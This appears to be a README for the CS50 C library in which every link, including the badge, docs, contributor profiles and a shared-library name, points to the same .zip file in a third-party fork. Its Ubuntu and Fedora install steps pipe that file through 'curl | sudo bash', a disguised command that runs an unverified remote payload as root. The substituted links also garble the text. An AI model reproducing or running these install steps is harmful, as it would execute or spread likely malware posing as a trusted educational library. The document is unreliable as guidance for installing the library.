# CS50 Library for C

[![Build Status](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)

## Development

`make`: builds dynamic library

`make deb`: builds source deb

`make install`: installs the library under `/usr/local` by default (set `DESTDIR` to change that)

## Installation

### Ubuntu

```
$ curl -s https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip | sudo bash
$ sudo apt-get install libcs50
```

### Fedora

```
$ curl -s https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip | sudo bash
$ yum install libcs50
```

### From Source (Linux and Mac)

1. Download the latest release from https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip
1. Extract `libcs50-*.*`
1. `cd libcs50-*`
1. `sudo make install`

By default, we install to `/usr/local`. If you'd like to change the installation location, run
`sudo DESTDIR=/path/to/install make install` as desired.

## Troubleshooting
1. If, when compiling a program, you see `/usr/bin/ld: cannot find -lcs50`:
Add `export LIBRARY_PATH=/usr/local/lib` to your `.bashrc`.
1. If, when compiling a program, you see `fatal error: 'cs50.h' file not found`:
Add `export C_INCLUDE_PATH=/usr/local/include` to your `.bashrc`.
1. If, when executing a program, you see `error while loading shared libraries: https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip cannot open shared object file: No such file or directory`:
Add `export LD_LIBRARY_PATH=/usr/local/lib` to your `.bashrc`.

Close and reopen any terminal windows.

## Usage

Link with `-lcs50`.

    #include <cs50.h>

    ...
    char c = get_char("Prompt: ");
    double d = get_double("Prompt: ");
    float f = get_float("Prompt: ");
    int i = get_int("Prompt: ");
    long l = get_long("Prompt: ");
    string s = get_string("Prompt: ");

    // deprecated as of fall 2017
    long long ll = get_long_long("Prompt: ");

## Documentation

See `man get_*` after installation, or [CS50 Reference](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)!

## TODO

*   Add tests.

## Contributors

*   [Chad Sharp](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
*   [Emrul Hasan Zawad](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
*   [Ivan Jasenov](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
*   [Kareem Zidane](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
